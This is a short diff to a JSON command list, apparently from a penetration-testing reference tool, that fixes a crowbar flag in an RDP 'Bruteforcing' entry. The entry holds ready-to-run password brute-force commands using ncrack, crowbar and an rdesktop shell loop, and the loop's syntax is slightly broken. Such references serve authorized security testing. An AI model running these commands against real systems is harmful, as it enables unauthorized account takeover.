@@ -161,7 +161,7 @@
                "description":"Bruteforcing",
                "commands":[  
                   "ncrack -vv --user administrator -P PASS_LIST rdp://$ip",
-                  "crowbar -b rdp -u -s $ip/32 -U USER_LIST -C PASS_LIST",
+                  "crowbar -b rdp -s $ip/32 -U USER_LIST -C PASS_LIST",
                   "for username in $(cat USER_LIST); do for password in $(cat PASS_LIST) do; rdesktop -u $username -p $password $ip; done; done;"
                ]
             }
